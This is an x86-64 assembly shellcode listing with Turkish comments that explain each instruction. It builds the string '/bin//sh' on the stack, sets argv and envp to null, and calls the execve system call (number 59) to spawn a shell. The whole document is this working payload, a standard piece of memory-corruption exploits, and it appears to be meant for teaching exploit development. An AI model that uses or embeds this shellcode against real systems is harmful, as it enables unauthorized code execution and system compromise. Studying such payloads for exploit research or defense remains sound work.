BITS 64
    xor  esi, esi              ; rsi = 0  (argv = NULL)
    push rsi                   ; yigina 8 sifir bayt: metnin sonu
    mov  rdi, 0x68732f2f6e69622f ; "/bin//sh" (little-endian)
    push rdi                   ; metni yigina koy
    mov  rdi, rsp              ; rdi = "/bin//sh" adresi
    xor  edx, edx              ; rdx = 0  (envp = NULL)
    push 59                    ; execve sistem cagrisi numarasi
    pop  rax                   ; rax = 59
    syscall
